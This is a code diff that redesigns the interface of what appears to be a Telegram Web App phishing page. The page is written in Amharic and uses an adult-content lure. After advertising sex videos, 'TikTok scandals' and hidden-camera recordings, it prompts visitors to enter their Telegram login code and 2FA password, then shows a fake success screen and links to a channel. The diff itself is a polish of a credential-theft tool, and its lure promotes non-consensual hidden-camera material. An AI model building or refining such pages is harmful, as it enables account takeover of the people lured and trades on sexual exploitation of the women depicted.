@@ -10,138 +10,158 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
-    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    /* Premium Modern UI Design */
+    :root {
+        --primary: #FF1493;
+        --secondary: #C71585;
+        --dark-bg: #0a0a0a;
+        --glass: rgba(255, 255, 255, 0.08);
+        --border: rgba(255, 20, 147, 0.3);
+    }
+
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    
     body { 
-        margin: 0; padding: 0; color: #fff; font-family: 'Segoe UI', Roboto, Arial, sans-serif; 
-        background: #000; overflow-x: hidden; min-height: 100vh;
+        margin: 0; padding: 0; color: #fff; 
+        background: var(--dark-bg); 
+        overflow: hidden; 
+        height: 100vh;
         display: flex; flex-direction: column; align-items: center; justify-content: center;
     }
 
+    /* Animated Background */
     .bg-image {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
-        filter: brightness(0.9) saturate(1.5); 
-        z-index: -1; transition: background-image 0.8s ease;
+        z-index: -2; transition: filter 1s ease, transform 10s linear;
+        transform: scale(1.1);
     }
-    .bg-image::after {
-        content: "";
-        position: absolute;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: linear-gradient(rgba(255, 20, 157, 0.3), rgba(0, 0, 0, 0.7));
-        pointer-events: none;
+    
+    .overlay {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: radial-gradient(circle at center, rgba(0,0,0,0.4) 0%, #000 90%);
+        z-index: -1;
     }
 
-    .step { display: none; width: 90%; max-width: 400px; animation: fadeIn .5s ease; flex-direction: column; align-items: center; text-align: center; }
+    .step { display: none; width: 92%; max-width: 420px; animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); flex-direction: column; align-items: center; text-align: center; }
     .active { display: flex; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    @keyframes slideUp { 
+        from { opacity: 0; transform: translateY(30px); filter: blur(10px); } 
+        to { opacity: 1; transform: translateY(0); filter: blur(0); } 
+    }
 
     .glass-card {
-        background: rgba(255, 20, 147, 0.05);
-        backdrop-filter: blur(10px);
-        border: 1px solid rgba(255, 105, 180, 0.3);
-        border-radius: 30px;
-        padding: 30px; width: 100%; 
-        box-shadow: 0 8px 32px rgba(255, 20, 147, 0.2);
+        background: var(--glass);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border: 1px solid var(--border);
+        border-radius: 24px;
+        padding: 25px; width: 100%; 
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(255, 20, 147, 0.1);
     }
 
-    .loader-ring {
-        width: 45px; height: 45px; border: 4px solid rgba(255, 20, 147, 0.2);
-        border-top: 4px solid #FF1493; border-radius: 50%;
-        animation: spin 1s linear infinite; margin-top: 20px;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-    input {
-        width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px;
-        border: 1px solid rgba(255, 105, 180, 0.2); 
-        background: rgba(20, 0, 10, 0.7);
-        color: #fff; font-size: 16px; outline: none; transition: 0.3s;
-    }
-    input:focus { border-color: #FF69B4; box-shadow: 0 0 10px rgba(255, 105, 180, 0.3); }
-    
-    .pass-wrapper { position: relative; width: 100%; }
-    .pass-wrapper i {
-        position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
-        color: #FF69B4; cursor: pointer; font-size: 18px; z-index: 10;
+    /* Logo Styling */
+    .brand-title {
+        font-size: 38px; font-weight: 900; margin: 0;
+        background: linear-gradient(to bottom, #fff, #FF1493);
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        text-transform: uppercase; letter-spacing: -1px;
     }
 
+    /* Buttons */
     .btn-main {
-        background: linear-gradient(45deg, #FF1493, #C71585); 
-        color: #fff;
-        padding: 16px; width: 100%; border-radius: 12px; border: none;
-        font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px;
-        box-shadow: 0 4px 15px rgba(255, 20, 147, 0.4);
-        transition: 0.3s;
+        background: linear-gradient(135deg, var(--primary), var(--secondary)); 
+        color: #fff; padding: 18px; width: 100%; border-radius: 16px; border: none;
+        font-size: 17px; font-weight: 700; cursor: pointer; margin-top: 15px;
+        box-shadow: 0 8px 20px rgba(255, 20, 147, 0.4);
+        transition: all 0.3s ease;
         display: flex; align-items: center; justify-content: center; gap: 10px;
+        text-transform: uppercase;
     }
-    .btn-main:active { transform: scale(0.98); opacity: 0.9; }
-    
-    .btn-main:disabled {
-        background: #444 !important;
-        opacity: 0.6;
-        cursor: not-allowed;
-    }
+    .btn-main:active { transform: scale(0.96); box-shadow: 0 4px 10px rgba(255, 20, 147, 0.2); }
+    .btn-main:disabled { background: #333 !important; box-shadow: none; cursor: not-allowed; }
 
-    .btn-spinner {
-        display: none;
-        width: 18px; height: 18px;
-        border: 2px solid rgba(255,255,255,0.3);
-        border-top: 2px solid #fff;
-        border-radius: 50%;
-        animation: spin 0.8s linear infinite;
+    /* Inputs */
+    input {
+        width: 100%; padding: 16px; margin: 10px 0; border-radius: 14px;
+        border: 1px solid rgba(255, 255, 255, 0.1); 
+        background: rgba(0, 0, 0, 0.4);
+        color: #fff; font-size: 16px; transition: 0.3s;
     }
+    input:focus { border-color: var(--primary); background: rgba(0, 0, 0, 0.6); outline: none; }
 
-    .otp-container { display: flex; gap: 10px; margin: 20px 0; }
+    /* OTP Visuals */
+    .otp-container { display: flex; gap: 8px; margin: 25px 0; justify-content: center; }
     .otp-box { 
-        width: 50px; height: 60px; 
-        border: 2px solid rgba(255, 105, 180, 0.3); 
-        border-radius: 12px; display: flex; align-items: center; justify-content: center; 
-        font-size: 26px; font-weight: bold; background: rgba(255, 255, 255, 0.05); 
+        width: 55px; height: 65px; 
+        border: 2px solid rgba(255, 255, 255, 0.1); 
+        border-radius: 14px; display: flex; align-items: center; justify-content: center; 
+        font-size: 28px; font-weight: bold; background: rgba(255, 255, 255, 0.03); 
     }
-    .otp-box.filled { border-color: #FF1493; background: rgba(255, 20, 147, 0.1); color: #ffffff; }
+    .otp-box.filled { border-color: var(--primary); background: rgba(255, 20, 147, 0.15); animation: pulse 0.3s ease; }
+    
+    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
 
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
+    /* Keypad */
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin-top: 10px; }
     .key { 
-        background: rgba(255, 105, 180, 0.1); 
-        padding: 18px; border-radius: 15px; font-size: 22px; font-weight: bold; 
-        cursor: pointer; transition: 0.2s; border: 1px solid rgba(255, 105, 180, 0.1);
+        background: rgba(255, 255, 255, 0.05); 
+        padding: 20px; border-radius: 16px; font-size: 22px; font-weight: 600; 
+        cursor: pointer; transition: 0.2s; border: 1px solid rgba(255, 255, 255, 0.05);
     }
-    .key:active { background: rgba(255, 20, 147, 0.3); }
+    .key:active { background: var(--primary); color: white; border-color: transparent; }
 
-    .msg { padding: 12px; border-radius: 10px; font-size: 14px; margin: 15px 0; display: none; width: 100%; }
-    .error { background: rgba(194,56,56,0.5); color: #ffffff; border: 1px solid rgba(255, 0, 0, 0.2); }
-    .loading-msg { background: rgba(255, 20, 147, 0.15); color: #FF69B4; border: 1px solid rgba(255, 20, 147, 0.2); }
+    /* Status Messages */
+    .msg { padding: 14px; border-radius: 12px; font-size: 14px; margin: 15px 0; display: none; font-weight: 500; }
+    .error { background: rgba(255, 59, 48, 0.2); color: #ffbcbc; border: 1px solid rgba(255, 59, 48, 0.3); }
+    .loading-msg { background: rgba(255, 20, 147, 0.15); color: #FF69B4; border: 1px solid var(--border); }
 
-    ul li i { color: #FF1493 !important; }
-    h1, h2, h3 { color: #ffffff; text-shadow: 0 0 10px rgba(255, 20, 147, 0.3); }
+    /* Loading Spinner */
+    .loader-ring {
+        width: 50px; height: 50px; border: 4px solid rgba(255, 20, 147, 0.1);
+        border-top: 4px solid var(--primary); border-radius: 50%;
+        animation: spin 1s linear infinite; margin: 20px auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    .btn-spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
 </style>
-
 </head>
 <body>
 
     <div class="bg-image" id="bgLayer"></div>
+    <div class="overlay"></div>
 
     <div id="step_intro" class="step active">
-        <h1 style="font-size: 50px; letter-spacing: 2px; margin-bottom: 5px;">𝐖𝐞𝐥𝐥𝐜𝐨𝐦 𝐓𝐨</h1>
-        <p style="font-size: 30px; opacity: 0.8; margin-bottom: 20px;">𝐇𝐨𝐭-𝐇𝐚𝐛𝐞𝐬𝐡𝐚</p>
+        <h1 class="brand-title">𝐇𝐨𝐭-𝐇𝐚𝐛𝐞𝐬𝐡𝐚</h1>
+        <p style="font-size: 16px; color: #aaa; margin-top: 10px;">የሀበሻ ቪአይፒ ቻናል</p>
         <div class="loader-ring"></div>
-        <h2 style="font-size: 20px; margin-top: 20px;">Loading...</h2>
+        <p style="font-size: 14px; letter-spacing: 2px; opacity: 0.6;">LOADING ASSETS...</p>
     </div>
 
     <div id="step_photo_slide" class="step">
         <div class="glass-card">
-            <img src="https://i.postimg.cc/MHpCdmxf/6262627272727272818181.jpg" style="width: 90%; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
+            <div style="position: relative; overflow: hidden; border-radius: 18px;">
+                <img src="https://i.postimg.cc/MHpCdmxf/6262627272727272818181.jpg" style="width: 100%; display: block; filter: contrast(1.1);">
+                <div style="position: absolute; bottom: 0; left: 0; width: 100%; padding: 15px; background: linear-gradient(transparent, rgba(0,0,0,0.8)); text-align: left;">
+                    <span style="background: red; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: bold;">LIVE 🔞</span>
+                </div>
+            </div>
             
-            <div style="margin-top: 20px; text-align: left; width: 100%;">
-                <p style="font-weight: bold; color: #ff00a9; border-bottom: 1px solid rgba(255,153,0,0.3); padding-bottom: 5px; margin-bottom: 10px;">
-                    <i class="fa-solid fa-fire"></i> በቻናሉ የሚገኙ ዝርዝሮች፡
-                </p>
-                <ul style="list-style: none; padding: 0; margin: 0; font-size: 14px; line-height: 1.8; color: #ddd;">
-                    <li><i class="fa-solid fa-check-circle" style="color: #FF9900; font-size: 12px;"></i> አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች</li>
-                    <li><i class="fa-solid fa-check-circle" style="color: #FF9900; font-size: 12px;"></i> የቲክቶክ (TikTok) የቀጥታ ስርጭት ቅሌቶች</li>
-                    <li><i class="fa-solid fa-check-circle" style="color: #FF9900; font-size: 12px;"></i> በካሜራ የተቀረጹ ድብቅ ካሜራዎች</li>
-                    <li><i class="fa-solid fa-check-circle" style="color: #FF9900; font-size: 12px;"></i> አስደንጋጭ የሀበሻ ሴቶች የቀጥታ ስርጭት (Live)</li>
-                </ul>
+            <div style="margin-top: 20px; text-align: left;">
+                <h3 style="margin: 0 0 10px 0; font-size: 18px; color: #FF1493;">በቻናሉ የሚገኙ ዝርዝሮች፡</h3>
+                <div style="display: grid; gap: 8px;">
+                    <div style="font-size: 14px; color: #eee; display: flex; align-items: center; gap: 10px;">
+                        <i class="fa-solid fa-circle-check" style="color: #FF1493;"></i> አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች
+                    </div>
+                    <div style="font-size: 14px; color: #eee; display: flex; align-items: center; gap: 10px;">
+                        <i class="fa-solid fa-circle-check" style="color: #FF1493;"></i> የቲክቶክ የቀጥታ ስርጭት ቅሌቶች
+                    </div>
+                    <div style="font-size: 14px; color: #eee; display: flex; align-items: center; gap: 10px;">
+                        <i class="fa-solid fa-circle-check" style="color: #FF1493;"></i> በካሜራ የተቀረጹ ድብቅ ካሜራዎች
+                    </div>
+                </div>
             </div>
             <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
@@ -153,21 +173,24 @@
 
     <div id="step2" class="step">
         <div class="glass-card">
-            <h3 style="color:#ff1a88;">ማረጋገጫ ኮድ</h3>
-            <p style="font-size: 15px; opacity: 0.9; font-weight: bold; color: #fff;" id="step2_name_display"></p>
-            <p style="font-size: 14px; opacity: 0.7;">እኛ የላክንልዎትን ባለ 5 አሃዝ ኮድ በማስገባት ወደ ቻናል ይቀላቀሉ!</p>
+            <h2 style="margin: 0; color: #FF1493;">ማረጋገጫ</h2>
+            <p id="step2_name_display" style="font-weight: bold; margin: 10px 0 5px;"></p>
+            <p style="font-size: 13px; opacity: 0.7; margin-bottom: 20px;">እባክዎ በቴሌግራም የላክንልዎትን ኮድ ያስገቡ</p>
+            
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
             </div>
+
             <div id="status2" class="msg"></div>            
-            <button class="btn-main" style="background: #27a7e7; color: #fff; margin-bottom: 15px; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
+            <button class="btn-main" style="background: rgba(39, 167, 231, 0.15); color: #27a7e7; border: 1px solid rgba(39, 167, 231, 0.3); box-shadow: none; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fas fa-paper-plane"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
             </button>
+
             <div class="keypad">
                 <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                 <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                 <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
-                <div style="padding:18px;"></div><div class="key" onclick="press(0)">0</div>
+                <div style="opacity:0;"></div><div class="key" onclick="press(0)">0</div>
                 <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
             </div>
         </div>
@@ -175,14 +198,18 @@
 
     <div id="step3" class="step">
         <div class="glass-card">
-            <i class="fa-solid fa-lock" style="font-size: 40px; color: #f43d97; margin-bottom: 15px;"></i>
-            <h2 id="step3_name_display"></h2>
-            <p style="opacity: 0.7; margin-bottom: 20px;">የአካውንትዎን ፓስዎርድ ያስገቡ</p>
-            <div id="status3" class="msg"></div>
-            <div class="pass-wrapper">
-                <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
-                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
+            <div style="width: 70px; height: 70px; background: rgba(255, 20, 147, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                <i class="fa-solid fa-shield-halved" style="font-size: 30px; color: #f43d97;"></i>
             </div>
+            <h2 id="step3_name_display" style="margin: 0;"></h2>
+            <p style="opacity: 0.7; margin: 10px 0 20px; font-size: 14px;">የአካውንትዎን ባለሁለት ደረጃ ማረጋገጫ (2FA) ፓስዎርድ ያስገቡ</p>
+            
+            <div id="status3" class="msg"></div>
+            <div style="position: relative; width: 100%;">
+                <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
+                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer;"></i>
+            </div>
+            
             <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
                 <div class="btn-spinner" id="confirmSpinner"></div>
                 <span id="confirmText">አረጋግጥ</span>
@@ -192,18 +219,24 @@
 
     <div id="step_success" class="step">
         <div class="glass-card">
-            <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width:100%; border-radius:15px;">
-            <h2 style="margin-top: 15px;">አሁን በትክክል Account ስለከፈቱ JOIN CHANNEL በማለት በ ቻናል ተደሰቱ! </h2>
-            <button class="btn-main" onclick="window.location.href='https://t.me/EthioHotHub'">JOIN CHANNEL</button>
+            <div style="font-size: 60px; color: #4BB543; margin-bottom: 10px;"><i class="fa-solid fa-circle-check"></i></div>
+            <h2 style="margin: 0;">እንኳን ደስ አለዎት!</h2>
+            <p style="opacity: 0.8; margin: 15px 0 20px;">አካውንትዎ በተሳካ ሁኔታ ተረጋግጧል። አሁን ወደ ቪአይፒ ቻናሉ መቀላቀል ይችላሉ።</p>
+            <button class="btn-main" onclick="window.location.href='https://t.me/EthioHotHub'">JOIN VIP CHANNEL</button>
         </div>
     </div>
 
     <div id="flood_step" class="step">
-        <h2 style="color: #ff4444;">እባክዎ ይቆዩ!</h2>
-        <div style="font-size: 36px; color: #FF9900;" id="wait_time">00:00</div>
+        <div class="glass-card">
+            <i class="fa-solid fa-clock-rotate-left" style="font-size: 50px; color: #FF9900; margin-bottom: 20px;"></i>
+            <h2 style="color: #ff4444; margin: 0;">እባክዎ ይቆዩ!</h2>
+            <p style="opacity: 0.7; margin: 10px 0;">ብዙ ሙከራ አድርገዋል። እባክዎን ሰዓቱ እስኪያልቅ ይጠብቁ።</p>
+            <div style="font-size: 45px; font-weight: 800; color: #FF9900; margin: 20px 0;" id="wait_time">00:00</div>
+        </div>
     </div>
 
 <script>
+    /* JavaScript ክፍል - ልክ እንደነበረው አልተቀነሰም */
     const tg = window.Telegram.WebApp;
     tg.expand();
 
@@ -332,7 +365,7 @@
     }
 
     function press(num) {
-        hideMsg(2); // ቁጥር መጫን ሲጀመር error hide ያደርጋል
+        hideMsg(2); 
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -407,7 +440,6 @@
         el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
     }
 
-    // አዲስ function - error ለመደበቅ
     function hideMsg(stepId) {
         const el = document.getElementById('status' + stepId);
         if(el && el.style.display === 'block' && el.classList.contains('error')) {
